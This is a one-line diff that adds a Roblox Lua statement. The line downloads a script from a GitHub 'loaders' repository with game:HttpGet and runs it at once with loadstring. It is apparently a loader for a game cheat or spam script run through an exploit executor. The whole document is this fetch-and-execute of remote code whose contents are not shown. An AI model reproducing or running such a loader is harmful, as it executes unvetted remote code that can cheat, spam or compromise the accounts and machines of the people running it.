@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/grave-digger-spam7-r34le6wlo8ez3a.lua"))()
